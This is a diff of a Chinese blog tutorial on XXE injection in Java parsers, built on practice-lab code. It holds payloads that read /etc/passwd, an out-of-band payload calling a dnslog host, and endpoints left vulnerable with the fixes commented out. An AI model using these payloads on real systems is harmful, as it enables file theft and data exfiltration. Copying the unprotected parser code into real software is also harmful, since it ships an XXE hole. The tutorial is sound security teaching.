+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">&lt;![CDATA[
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   function matchwo(a,b)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    if (a &lt; b &amp;&amp; a &lt; 0) then
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      {return 1;}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    else
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      {return 0;}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   ]]&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/script&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/book&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/bookstore&gt;</span>
+</span></span></code></pre></div><h4 id="dtd">DTD</h4>
+<p>DTD（Document Type Definition）是用来定义 XML 文档的结构和合法元素的集合。
 DTD 定义了 XML 文档中可以出现的元素、属性和它们的顺序，以确保 XML 数据的格式和结构符合预定义的规则。
-DTD 可以嵌入到 XML 文档中，也可以外部定义并引用。</p><p>DOCTYPE是DTD的声明
-!ELEMENT> 声明用于定义 XML 文档中元素的结构和内容模型。它指定了元素的名称及其允许的子元素、文本内容或其他结构。
+DTD 可以嵌入到 XML 文档中，也可以外部定义并引用。</p>
+<p>DOCTYPE是DTD的声明
+!ELEMENT&gt; 声明用于定义 XML 文档中元素的结构和内容模型。它指定了元素的名称及其允许的子元素、文本内容或其他结构。
 ENTITY是实体的声明，所谓实体可以理解为变量
-SYSTEM、PUBLIC是外部资源的申请</p><p>从两个角度可以把XML分为两类共4个类型：</p><p>（内部实体、外部实体）</p><p>（通用实体、参数实体）</p><p>1)内部实体
+SYSTEM、PUBLIC是外部资源的申请</p>
+<p>从两个角度可以把XML分为两类共4个类型：</p>
+<p>（内部实体、外部实体）</p>
+<p>（通用实体、参数实体）</p>
+<p>1)内部实体
 所谓内部实体是指在一个实体中定义的另一个实体，也就是嵌套定义。
-<img loading=lazy decoding=async src=https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_1.png alt>
-<img loading=lazy decoding=async src=https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_2.png alt>
-使用&amp;xxe对上面定义的xxe实体进行了引用，到时候输出的时候&amp;xxe就会被“test”替换。</p><p>在XML内部声明DTD:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34;?&gt;</span>
-</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE note [
-</span></span></span><span style=display:flex><span><span style=color:#75715e>  &lt;!ELEMENT note (to,from,heading,body)&gt;</span>
-</span></span><span style=display:flex><span>  <span style=color:#75715e>&lt;!ELEMENT to      (#PCDATA)&gt;</span>
-</span></span><span style=display:flex><span>  <span style=color:#75715e>&lt;!ELEMENT from    (#PCDATA)&gt;</span>
-</span></span><span style=display:flex><span>  <span style=color:#75715e>&lt;!ELEMENT message (#PCDATA)&gt;</span>
-</span></span><span style=display:flex><span>]&gt;
-</span></span><span style=display:flex><span><span style=color:#f92672>&lt;note&gt;</span>
-</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;to&gt;</span>George<span style=color:#f92672>&lt;/to&gt;</span>
-</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;from&gt;</span>John<span style=color:#f92672>&lt;/from&gt;</span>
-</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;message&gt;</span>Reminder<span style=color:#f92672>&lt;/message&gt;</span>
-</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/note&gt;</span>
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_1.png" alt=""  />
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_2.png" alt=""  />
+使用&amp;xxe对上面定义的xxe实体进行了引用，到时候输出的时候&amp;xxe就会被“test”替换。</p>
+<p>在XML内部声明DTD:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE note [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!ELEMENT to      (#PCDATA)&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!ELEMENT from    (#PCDATA)&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!ELEMENT message (#PCDATA)&gt;</span>
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;note&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;to&gt;</span>George<span style="color:#f92672">&lt;/to&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;from&gt;</span>John<span style="color:#f92672">&lt;/from&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;message&gt;</span>Reminder<span style="color:#f92672">&lt;/message&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/note&gt;</span>
 </span></span></code></pre></div><p>2）外部实体
-外部实体表示外部文件的内容，用 SYSTEM 关键词表示，通常使用下面的格式来引用</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY entityName SYSTEM &#34;fileName&#34;&gt;</span>
-</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY example SYSTEM &#34;/etc/passwd&#34;&gt;</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY entityName PUBLIC &#34;publicID&#34; &#34;fileName&#34;&gt;</span>
-</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY example PUBLIC &#34;-//W3C//DTD HTML 4.01 Transitional//EN&#34; &#34;html4-transitional.dtd&#34;&gt;</span>
-</span></span></code></pre></div><p><img loading=lazy decoding=async src=https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_3.png alt>
+外部实体表示外部文件的内容，用 SYSTEM 关键词表示，通常使用下面的格式来引用</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY entityName SYSTEM &#34;fileName&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY example SYSTEM &#34;/etc/passwd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY entityName PUBLIC &#34;publicID&#34; &#34;fileName&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY example PUBLIC &#34;-//W3C//DTD HTML 4.01 Transitional//EN&#34; &#34;html4-transitional.dtd&#34;&gt;</span>
+</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_3.png" alt=""  />
 有些XML文档包含system标识符定义的“实体”，这些文档会在DOCTYPE头部标签中呈现。这些定义的’实体’能够访问本地或者远程的内容。
-假如 SYSTEM 后面的内容可以被攻击者控制，那么攻击者就可以随意替换为其他内容，从而读取服务器本地文件（file:///etc/passwd）或者远程文件（http://www.baidu.com/abc.txt）。</p><p>3）通用实体
-用”&实体名“引用的实体，在DTD中定义，在XML文档中引用。
-<img loading=lazy decoding=async src=https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_4.png alt></p><p>4）参数实体
+假如 SYSTEM 后面的内容可以被攻击者控制，那么攻击者就可以随意替换为其他内容，从而读取服务器本地文件（file:///etc/passwd）或者远程文件（http://www.baidu.com/abc.txt）。</p>
+<p>3）通用实体
+用”&amp;实体名“引用的实体，在DTD中定义，在XML文档中引用。
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_4.png" alt=""  /></p>
+<p>4）参数实体
 使用<code>% 实体名</code>（这里空格不能少）在 DTD 中定义，并且只能在 DTD 中使用<code>%实体名;</code>引用
 只有在DTD文件中，参数实体的声明才能引用其他实体
 和通用实体一样，参数实体也可以外部引用
-<img loading=lazy decoding=async src=https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_5.png alt></p><h3 id=xxe>XXE</h3><p>XXE（XML External Entity Injection，XML 外部实体注入）是一种安全漏洞，通常发生在解析 XML 数据时。攻击者通过在 XML 文档中注入外部实体来读取本地文件、发送数据到远程服务器，甚至执行其他恶意操作。
-XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全问题。</p><p>XXE漏洞之所以名为外部实体漏洞，就是因为问题主要出自于外部资源的申请以及外部实体的引用这部分特性中。我们从XXE的全称（XML外部实体注入）可以看出，XXE也是一种XML注入，只不过注入的是XML外部实体罢了。
-<img loading=lazy decoding=async src=https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_6.png alt=|500></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
-</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE foo [  
-</span></span></span><span style=display:flex><span><span style=color:#75715e>  &lt;!ELEMENT foo ANY &gt;</span>
-</span></span><span style=display:flex><span>  <span style=color:#75715e>&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>]&gt;<span style=color:#f92672>&lt;foo&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/foo&gt;</span>
-</span></span></code></pre></div><p>在这个示例中，<code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" > </code>定义了一个外部实体 xxe，指向本地文件 /etc/passwd。
-当 XML 解析器解析这个 XML 数据时，它会尝试读取 /etc/passwd 文件的内容并将其插入到 <foo>&amp;xxe;</foo> 标签中。</p><h3 id=java-解析xml的四种方式>Java 解析XML的四种方式</h3><ol><li><p>DOM（Document Object Model）解析</p><ul><li>DocumentBuilder: 用于解析 XML 数据并构建 DOM 文档对象模型。属于 JAXP（Java API for XML Processing）。</li><li>DOMParser: 一般指 DOM 解析器的实现（如 org.w3c.dom.DocumentBuilder）。它用于将 XML 数据解析成 DOM 文档结构。</li></ul></li><li><p>SAX（Simple API for XML）解析</p><ul><li>SAXParser: SAX 解析器，用于逐行读取 XML 数据，并触发相应的事件。属于 JAXP（Java API for XML Processing）。</li><li>Unmarshaller: JAXB 中的组件，用于将 XML 数据转换为 Java 对象。虽然它在 JAXB 中不直接属于 SAX，但它可以配置 SAX 解析器来处理 XML 数据。</li></ul></li><li><p>JDOM 解析</p><ul><li>SAXBuilder: JDOM 提供的一个类，用于通过 SAX 解析器构建 JDOM 文档对象模型。JDOM 是一个独立的 XML 处理库，与 DOM4J 和 JAXB 不同。</li></ul></li><li><p>DOM4J（Document Object Model for Java）解析</p><ul><li>SAXReader: DOM4J 提供的一个类，用于使用 SAX 解析 XML 数据。实际上，SAXReader 是 DOM4J 的一部分，而不是独立的 SAX 解析器。</li></ul></li></ol><h2 id=复现平台>复现平台</h2><p><a href=https://github.com/j3ers3/Hello-Java-Sec target=_blank rel="noopener nofollow noreferrer">Hello-Java-Sec</a>
-<a href=https://github.com/bewhale/JavaSec target=_blank rel="noopener nofollow noreferrer">JavaSec</a></p><h2 id=漏洞分析>漏洞分析</h2><p>按照这两个平台提供的资源,来看看具体产生漏洞的代码.</p><h3 id=xmlreader>XMLReader</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#75715e>/**
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * XMLReader 是一个接口，用于解析 XML 文档。它是 SAX (Simple API for XML) 的核心组件之一。
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * 它提供了对 XML 文档的逐行读取和解析功能，并将事件传递给相应的处理器。
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * 使用 XMLReader 时，需要注意安全问题，例如防止 XML 外部实体注入攻击。
-</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
-</span></span><span style=display:flex><span> 
-</span></span><span style=display:flex><span><span style=color:#75715e>// payload: &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &#34;dsm6kqkg.dnslog.pw&#34;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>XMLReader</span>(<span style=color:#a6e22e>@RequestBody</span> String content) {
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
-</span></span><span style=display:flex><span>        XMLReader xmlReader <span style=color:#f92672>=</span> XMLReaderFactory.<span style=color:#a6e22e>createXMLReader</span>();
-</span></span><span style=display:flex><span>        <span style=color:#75715e>// 修复：禁用外部实体</span>
-</span></span><span style=display:flex><span>        <span style=color:#75715e>// xmlReader.setFeature(&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;, true);</span>
-</span></span><span style=display:flex><span>        xmlReader.<span style=color:#a6e22e>parse</span>(<span style=color:#66d9ef>new</span> InputSource(<span style=color:#66d9ef>new</span> StringReader(content)));
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;XMLReader XXE&#34;</span>;
-</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>catch</span> (Exception e) {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> e.<span style=color:#a6e22e>toString</span>();
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p><img loading=lazy decoding=async src=https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_2.png alt>
-修复方法就是上面代码中的,setFeature,禁用外部实体</p><h3 id=saxparser>SAXParser</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>/**
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * javax.xml.parsers.SAXParser 是 XMLReader 的替代品，它提供了更多的安全措施，
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * 例如默认禁用 DTD 和外部实体的声明。如果需要使用 DTD 或外部实体，可以手动启用它们，
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * 并使用相应的安全措施。
-</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>@ApiOperation</span>(value <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;vul：SAXParser&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#a6e22e>@RequestMapping</span>(value <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/SAXParser&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>SAXParser</span>(<span style=color:#a6e22e>@RequestParam</span> String content) {
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>try</span> {
-</span></span><span style=display:flex><span>		SAXParserFactory factory <span style=color:#f92672>=</span> SAXParserFactory.<span style=color:#a6e22e>newInstance</span>();
-</span></span><span style=display:flex><span>		SAXParser parser <span style=color:#f92672>=</span> factory.<span style=color:#a6e22e>newSAXParser</span>();
-</span></span><span style=display:flex><span>		parser.<span style=color:#a6e22e>parse</span>(<span style=color:#66d9ef>new</span> InputSource(<span style=color:#66d9ef>new</span> StringReader(content)), <span style=color:#66d9ef>new</span> DefaultHandler());
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;SAXParser XXE&#34;</span>;
-</span></span><span style=display:flex><span>	} <span style=color:#66d9ef>catch</span> (Exception e) {
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> e.<span style=color:#a6e22e>toString</span>();
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>}
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_5.png" alt=""  /></p>
+<h3 id="xxe">XXE</h3>
+<p>XXE（XML External Entity Injection，XML 外部实体注入）是一种安全漏洞，通常发生在解析 XML 数据时。攻击者通过在 XML 文档中注入外部实体来读取本地文件、发送数据到远程服务器，甚至执行其他恶意操作。
+XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全问题。</p>
+<p>XXE漏洞之所以名为外部实体漏洞，就是因为问题主要出自于外部资源的申请以及外部实体的引用这部分特性中。我们从XXE的全称（XML外部实体注入）可以看出，XXE也是一种XML注入，只不过注入的是XML外部实体罢了。
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_6.png" alt="|500"  /></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;!ELEMENT foo ANY &gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>]&gt;<span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
+</span></span></code></pre></div><p>在这个示例中，<code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt; </code>定义了一个外部实体 xxe，指向本地文件 /etc/passwd。
+当 XML 解析器解析这个 XML 数据时，它会尝试读取 /etc/passwd 文件的内容并将其插入到 <foo>&amp;xxe;</foo> 标签中。</p>
+<h3 id="java-解析xml的四种方式">Java 解析XML的四种方式</h3>
+<ol>
+<li>
+<p>DOM（Document Object Model）解析</p>
+<ul>
+<li>DocumentBuilder: 用于解析 XML 数据并构建 DOM 文档对象模型。属于 JAXP（Java API for XML Processing）。</li>
+<li>DOMParser: 一般指 DOM 解析器的实现（如 org.w3c.dom.DocumentBuilder）。它用于将 XML 数据解析成 DOM 文档结构。</li>
+</ul>
+</li>
+<li>
+<p>SAX（Simple API for XML）解析</p>
+<ul>
+<li>SAXParser: SAX 解析器，用于逐行读取 XML 数据，并触发相应的事件。属于 JAXP（Java API for XML Processing）。</li>
+<li>Unmarshaller: JAXB 中的组件，用于将 XML 数据转换为 Java 对象。虽然它在 JAXB 中不直接属于 SAX，但它可以配置 SAX 解析器来处理 XML 数据。</li>
+</ul>
+</li>
+<li>
+<p>JDOM 解析</p>
+<ul>
+<li>SAXBuilder: JDOM 提供的一个类，用于通过 SAX 解析器构建 JDOM 文档对象模型。JDOM 是一个独立的 XML 处理库，与 DOM4J 和 JAXB 不同。</li>
+</ul>
+</li>
+<li>
+<p>DOM4J（Document Object Model for Java）解析</p>
+<ul>
+<li>SAXReader: DOM4J 提供的一个类，用于使用 SAX 解析 XML 数据。实际上，SAXReader 是 DOM4J 的一部分，而不是独立的 SAX 解析器。</li>
+</ul>
+</li>
+</ol>
+<h2 id="复现平台">复现平台</h2>
+<p><a href="https://github.com/j3ers3/Hello-Java-Sec" target="_blank" rel="noopener nofollow noreferrer" >Hello-Java-Sec</a>
+<a href="https://github.com/bewhale/JavaSec" target="_blank" rel="noopener nofollow noreferrer" >JavaSec</a></p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>按照这两个平台提供的资源,来看看具体产生漏洞的代码.</p>
+<h3 id="xmlreader">XMLReader</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * XMLReader 是一个接口，用于解析 XML 文档。它是 SAX (Simple API for XML) 的核心组件之一。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 它提供了对 XML 文档的逐行读取和解析功能，并将事件传递给相应的处理器。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 使用 XMLReader 时，需要注意安全问题，例如防止 XML 外部实体注入攻击。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// payload: &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &#34;dsm6kqkg.dnslog.pw&#34;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">XMLReader</span>(<span style="color:#a6e22e">@RequestBody</span> String content) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        XMLReader xmlReader <span style="color:#f92672">=</span> XMLReaderFactory.<span style="color:#a6e22e">createXMLReader</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 修复：禁用外部实体</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// xmlReader.setFeature(&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;, true);</span>
+</span></span><span style="display:flex;"><span>        xmlReader.<span style="color:#a6e22e">parse</span>(<span style="color:#66d9ef">new</span> InputSource(<span style="color:#66d9ef">new</span> StringReader(content)));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;XMLReader XXE&#34;</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> e.<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_2.png" alt=""  />
+修复方法就是上面代码中的,setFeature,禁用外部实体</p>
+<h3 id="saxparser">SAXParser</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * javax.xml.parsers.SAXParser 是 XMLReader 的替代品，它提供了更多的安全措施，
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 例如默认禁用 DTD 和外部实体的声明。如果需要使用 DTD 或外部实体，可以手动启用它们，
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 并使用相应的安全措施。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ApiOperation</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;vul：SAXParser&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@RequestMapping</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/SAXParser&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">SAXParser</span>(<span style="color:#a6e22e">@RequestParam</span> String content) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>		SAXParserFactory factory <span style="color:#f92672">=</span> SAXParserFactory.<span style="color:#a6e22e">newInstance</span>();
+</span></span><span style="display:flex;"><span>		SAXParser parser <span style="color:#f92672">=</span> factory.<span style="color:#a6e22e">newSAXParser</span>();
+</span></span><span style="display:flex;"><span>		parser.<span style="color:#a6e22e">parse</span>(<span style="color:#66d9ef">new</span> InputSource(<span style="color:#66d9ef">new</span> StringReader(content)), <span style="color:#66d9ef">new</span> DefaultHandler());
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;SAXParser XXE&#34;</span>;
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> e.<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>会有报错信息,但是dnslog弹成功了
-<img loading=lazy decoding=async src=https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_7.png alt>
-<img loading=lazy decoding=async src=https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_8.png alt></p><h3 id=saxreader>SAXReader</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>/**
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * SAXReader 是一个用于读取和解析 XML 文档的类。它基于 SAX (Simple API for XML) 实现，
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * 提供了简单的 API 以便快速解析 XML。SAXReader 通常用于处理大规模 XML 数据流。
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * 在使用 SAXReader 时，需要采取相应的安全措施来防止 XML 外部实体注入等攻击。
-</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>@ApiOperation</span>(value <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;vul：SAXReader&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#a6e22e>@RequestMapping</span>(value <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/SAXReader&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>SAXReader</span>(<span style=color:#a6e22e>@RequestParam</span> String content) {
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>try</span> {
-</span></span><span style=display:flex><span>		SAXReader sax <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> SAXReader();
-</span></span><span style=display:flex><span>		<span style=color:#75715e>// 修复：禁用外部实体</span>
-</span></span><span style=display:flex><span>		<span style=color:#75715e>// sax.setFeature(&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;, true);</span>
-</span></span><span style=display:flex><span>		sax.<span style=color:#a6e22e>read</span>(<span style=color:#66d9ef>new</span> InputSource(<span style=color:#66d9ef>new</span> StringReader(content)));
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;SAXReader XXE&#34;</span>;
-</span></span><span style=display:flex><span>	} <span style=color:#66d9ef>catch</span> (Exception e) {
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> e.<span style=color:#a6e22e>toString</span>();
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><h3 id=saxbuilder>SAXBuilder</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>/**
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * SAXBuilder 是一个用于构建 JDOM (Java Document Object Model) 文档的类。
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * 它基于 SAX 解析器，将 XML 数据解析为 JDOM 文档对象。SAXBuilder 提供了易于使用的 API，
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * 使得在内存中操作 XML 文档更加方便。在使用 SAXBuilder 时，应确保配置正确的安全设置，
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * 以防止潜在的 XML 处理漏洞。
-</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
-</span></span><span style=display:flex><span>
